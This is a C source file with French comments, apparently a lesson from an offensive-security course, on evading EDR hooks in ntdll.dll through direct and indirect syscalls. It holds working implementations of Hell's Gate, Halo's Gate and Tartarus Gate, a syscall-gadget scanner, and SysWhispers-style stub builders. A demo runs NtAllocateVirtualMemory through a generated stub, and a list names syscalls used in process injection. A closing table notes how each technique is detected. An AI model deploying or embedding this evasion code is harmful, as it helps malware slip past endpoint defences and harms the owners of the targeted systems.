/*
 * OBJECTIF  : Comprendre les syscalls directs pour contourner les hooks EDR
 * PREREQUIS : Module 06-NTDLL-Internals, format PE, inline assembly
 * COMPILE   : cl example.c /Fe:example.exe
 *
 * Les EDR placent des hooks (JMP) dans ntdll.dll pour intercepter les appels systeme.
 * Les syscalls directs contournent ces hooks en invoquant directement le kernel.
 *
 * Techniques presentees :
 * 1. Hell's Gate  : extraction du SSN depuis le stub ntdll
 * 2. Halo's Gate  : resolution par voisinage si la fonction est hookee
 * 3. Tartarus Gate : detection multi-pattern des hooks
 * 4. SysWhispers  : generation de stubs a l'execution
 * 5. Indirect syscalls : utilisation de l'instruction syscall depuis ntdll
 */

#include <windows.h>
#include <stdio.h>

typedef LONG NTSTATUS;
#define NT_SUCCESS(s) ((NTSTATUS)(s) >= 0)

/* ==========================================================================
 * Hell's Gate : extraire le SSN (System Service Number) depuis ntdll
 * Le stub syscall x64 normal :
 *   4C 8B D1       mov r10, rcx
 *   B8 XX XX 00 00 mov eax, SSN
 *   0F 05          syscall
 *   C3             ret
 * ========================================================================== */
DWORD hells_gate(BYTE* func) {
    if (func[0] == 0x4C && func[1] == 0x8B && func[2] == 0xD1 &&
        func[3] == 0xB8 && func[6] == 0x00 && func[7] == 0x00) {
        return *(DWORD*)(func + 4);
    }
    return 0; /* Hookee ou pattern inconnu */
}

/* ==========================================================================
 * Halo's Gate : si la fonction est hookee, regarder les voisins
 * Les stubs syscall sont espaces de ~32 octets dans ntdll
 * Si le voisin N a SSN=X, alors notre SSN = X +/- distance
 * ========================================================================== */
DWORD halos_gate(BYTE* func) {
    /* Essayer d'abord l'extraction directe */
    DWORD ssn = hells_gate(func);
    if (ssn != 0) return ssn;

    /* Fonction hookee -> chercher dans les voisins */
    for (int i = 1; i < 500; i++) {
        /* Voisin vers le haut (adresse inferieure) */
        BYTE* up = func - (32 * i);
        if (up[0] == 0x4C && up[1] == 0x8B && up[2] == 0xD1 && up[3] == 0xB8) {
            ssn = *(DWORD*)(up + 4);
            return ssn + i; /* Notre SSN = voisin + distance */
        }
        /* Voisin vers le bas (adresse superieure) */
        BYTE* down = func + (32 * i);
        if (down[0] == 0x4C && down[1] == 0x8B && down[2] == 0xD1 && down[3] == 0xB8) {
            ssn = *(DWORD*)(down + 4);
            return ssn - i; /* Notre SSN = voisin - distance */
        }
    }
    return 0;
}

/* ==========================================================================
 * Tartarus Gate : detection multi-pattern des hooks avant resolution
 * ========================================================================== */
DWORD tartarus_gate(BYTE* func) {
    /* Detecter les patterns de hooks courants */
    if (func[0] == 0xE9 ||                          /* JMP rel32 */
        func[0] == 0xEB ||                          /* JMP rel8  */
        (func[0] == 0xFF && func[1] == 0x25) ||    /* JMP [rip+disp32] */
        (func[0] == 0x0F && func[1] == 0x1F)) {    /* NOP with ModRM (padding hook) */
        return halos_gate(func); /* Hookee -> resolution par voisinage */
    }
    return hells_gate(func); /* Pas hookee -> extraction directe */
}

/* ==========================================================================
 * Trouver un gadget syscall;ret (0F 05 C3) dans ntdll
 * Pour les indirect syscalls, on saute vers cette instruction
 * au lieu d'executer syscall nous-memes
 * ========================================================================== */
typedef struct {
    BYTE* syscall_addr;  /* Adresse de l'instruction syscall (0F 05) */
    BYTE* ret_addr;      /* Adresse du ret qui suit (C3) */
} SYSCALL_GADGET;

SYSCALL_GADGET find_syscall_gadget(HMODULE ntdll) {
    SYSCALL_GADGET gadget = {NULL, NULL};
    BYTE* base = (BYTE*)ntdll;

    /* Scanner ntdll pour trouver la sequence 0F 05 C3 (syscall; ret) */
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(base + dos->e_lfanew);
    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);

    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (memcmp(sec[i].Name, ".text", 5) == 0) {
            BYTE* text = base + sec[i].VirtualAddress;
            DWORD size = sec[i].Misc.VirtualSize;
            for (DWORD j = 0; j < size - 3; j++) {
                if (text[j] == 0x0F && text[j+1] == 0x05 && text[j+2] == 0xC3) {
                    gadget.syscall_addr = text + j;
                    gadget.ret_addr = text + j + 2;
                    return gadget;
                }
            }
            break;
        }
    }
    return gadget;
}

/* ==========================================================================
 * SysWhispers : generation de stubs a l'execution
 * ========================================================================== */
void build_direct_stub(BYTE* stub, DWORD ssn) {
    /* mov r10, rcx */
    stub[0] = 0x4C; stub[1] = 0x8B; stub[2] = 0xD1;
    /* mov eax, SSN */
    stub[3] = 0xB8;
    *(DWORD*)(stub + 4) = ssn;
    /* syscall */
    stub[8] = 0x0F; stub[9] = 0x05;
    /* ret */
    stub[10] = 0xC3;
}

void build_indirect_stub(BYTE* stub, DWORD ssn, BYTE* syscall_addr) {
    /* mov r10, rcx */
    stub[0] = 0x4C; stub[1] = 0x8B; stub[2] = 0xD1;
    /* mov eax, SSN */
    stub[3] = 0xB8;
    *(DWORD*)(stub + 4) = ssn;
    /* jmp [rip+0] ; adresse du syscall dans ntdll */
    stub[8] = 0xFF; stub[9] = 0x25;
    *(DWORD*)(stub + 10) = 0;
    *(BYTE**)(stub + 14) = syscall_addr;
}

/* ==========================================================================
 * Table de syscalls resolus
 * ========================================================================== */
typedef struct {
    const char* name;
    DWORD       ssn;
    BYTE*       addr;
    BOOL        hooked;
} RESOLVED_SYSCALL;

#define MAX_SYSCALLS 16

/* Demo 1 : Resolution des SSN avec les 3 techniques */
void demo_ssn_resolution(HMODULE ntdll) {
    printf("[1] Resolution des SSN (Hell's Gate / Halo's Gate / Tartarus Gate)\n\n");

    const char* targets[] = {
        "NtAllocateVirtualMemory",
        "NtProtectVirtualMemory",
        "NtWriteVirtualMemory",
        "NtCreateThreadEx",
        "NtOpenProcess",
        "NtClose",
        "NtQueueApcThread",
        "NtWaitForSingleObject",
        NULL
    };

    for (int i = 0; targets[i]; i++) {
        BYTE* addr = (BYTE*)GetProcAddress(ntdll, targets[i]);
        if (!addr) continue;

        DWORD ssn_hell = hells_gate(addr);
        DWORD ssn_halo = halos_gate(addr);
        DWORD ssn_tart = tartarus_gate(addr);

        BOOL hooked = (ssn_hell == 0);

        printf("    %-30s @ %p  SSN=0x%04X  %s\n",
               targets[i], addr, ssn_tart,
               hooked ? "[HOOKED -> Halo's Gate]" : "[CLEAN]");

        /* Afficher les premiers octets du stub */
        printf("        Bytes: ");
        for (int j = 0; j < 8; j++) printf("%02X ", addr[j]);
        printf("\n");
    }
    printf("\n");
}

/* Demo 2 : Generation de stubs (direct vs indirect) */
void demo_stub_generation(HMODULE ntdll) {
    printf("[2] Generation de stubs syscall (SysWhispers pattern)\n\n");

    BYTE* func = (BYTE*)GetProcAddress(ntdll, "NtAllocateVirtualMemory");
    DWORD ssn = tartarus_gate(func);
    SYSCALL_GADGET gadget = find_syscall_gadget(ntdll);

    printf("    [+] NtAllocateVirtualMemory SSN = 0x%04X\n", ssn);
    printf("    [+] Gadget syscall;ret @ %p\n\n", gadget.syscall_addr);

    /* Stub direct : contient l'instruction syscall */
    BYTE direct_stub[16] = {0};
    build_direct_stub(direct_stub, ssn);

    printf("    [Direct stub] (syscall dans notre code) :\n        ");
    for (int i = 0; i < 11; i++) printf("%02X ", direct_stub[i]);
    printf("\n        Decode: mov r10,rcx ; mov eax,0x%04X ; syscall ; ret\n\n", ssn);

    /* Stub indirect : saute vers syscall dans ntdll */
    BYTE indirect_stub[24] = {0};
    if (gadget.syscall_addr) {
        build_indirect_stub(indirect_stub, ssn, gadget.syscall_addr);
        printf("    [Indirect stub] (saute vers ntdll pour syscall) :\n        ");
        for (int i = 0; i < 22; i++) printf("%02X ", indirect_stub[i]);
        printf("\n        Decode: mov r10,rcx ; mov eax,0x%04X ; jmp [ntdll!syscall]\n\n", ssn);
    }

    printf("    [*] Direct   : syscall execute depuis notre .text (detectable par call stack)\n");
    printf("    [*] Indirect : syscall execute depuis ntdll (call stack propre)\n\n");
}

/* Demo 3 : Execution reelle avec un stub genere */
void demo_execution(HMODULE ntdll) {
    printf("[3] Execution d'un syscall genere a l'execution\n\n");

    BYTE* func = (BYTE*)GetProcAddress(ntdll, "NtAllocateVirtualMemory");
    DWORD ssn = tartarus_gate(func);

    /* Allouer de la memoire executable pour le stub */
    BYTE* stub_mem = (BYTE*)VirtualAlloc(NULL, 4096,
                                          MEM_COMMIT | MEM_RESERVE,
                                          PAGE_READWRITE);
    if (!stub_mem) {
        printf("    [-] VirtualAlloc echoue\n");
        return;
    }

    /* Construire le stub direct */
    build_direct_stub(stub_mem, ssn);

    /* Rendre executable */
    DWORD old;
    VirtualProtect(stub_mem, 4096, PAGE_EXECUTE_READ, &old);

    /* Definir le type de la fonction NtAllocateVirtualMemory */
    typedef NTSTATUS (NTAPI *pNtAllocateVirtualMemory)(
        HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);

    pNtAllocateVirtualMemory NtAVM = (pNtAllocateVirtualMemory)stub_mem;

    /* Appeler via notre stub pour allouer de la memoire */
    PVOID base = NULL;
    SIZE_T size = 4096;
    NTSTATUS status = NtAVM((HANDLE)-1, &base, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if (NT_SUCCESS(status)) {
        printf("    [+] NtAllocateVirtualMemory via stub : base=%p, size=0x%llX\n",
               base, (unsigned long long)size);
        printf("    [+] Allocation reussie sans passer par ntdll!\n");
        /* Ecrire pour prouver que ca fonctionne */
        memset(base, 0x41, 16);
        printf("    [+] Ecriture dans la zone allouee : OK\n");
        VirtualFree(base, 0, MEM_RELEASE);
    } else {
        printf("    [-] NtAllocateVirtualMemory echoue : 0x%08lX\n", status);
    }

    VirtualFree(stub_mem, 0, MEM_RELEASE);
    printf("\n");
}

/* Demo 4 : Comparaison des techniques */
void demo_comparison(void) {
    printf("[4] Comparaison des techniques de syscall\n\n");

    printf("    Technique           | Hook Bypass | Call Stack | Difficulte\n");
    printf("    --------------------|-------------|------------|------------\n");
    printf("    CreateRemoteThread  | Non         | Propre     | Facile\n");
    printf("    ntdll!Nt* direct    | Non (hookee)| Propre     | Facile\n");
    printf("    Direct syscall      | Oui         | Anormal    | Moyen\n");
    printf("    Indirect syscall    | Oui         | Propre     | Avance\n");
    printf("    Hell's Gate         | Oui         | Anormal    | Avance\n");
    printf("    Halo's Gate         | Oui (multi) | Anormal    | Avance\n");
    printf("    SysWhispers3        | Oui         | Propre     | Expert\n\n");

    printf("    Detection :\n");
    printf("    - Direct syscall : return address hors ntdll (call stack analysis)\n");
    printf("    - Indirect syscall : RW/RX allocation contenant un stub (memory scan)\n");
    printf("    - Tous : ETW TI (Threat Intelligence) events kernel-level\n");
    printf("    - Kernel callbacks non contournes par usermode syscalls\n\n");
}

int main(void) {
    printf("[*] Demo : Direct Syscalls - Bypass EDR Hooks\n");
    printf("[*] ==========================================\n\n");

    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    printf("[+] ntdll.dll : %p\n\n", ntdll);

    demo_ssn_resolution(ntdll);
    demo_stub_generation(ntdll);
    demo_execution(ntdll);
    demo_comparison();

    printf("[+] Exemple termine avec succes\n");
    return 0;
}
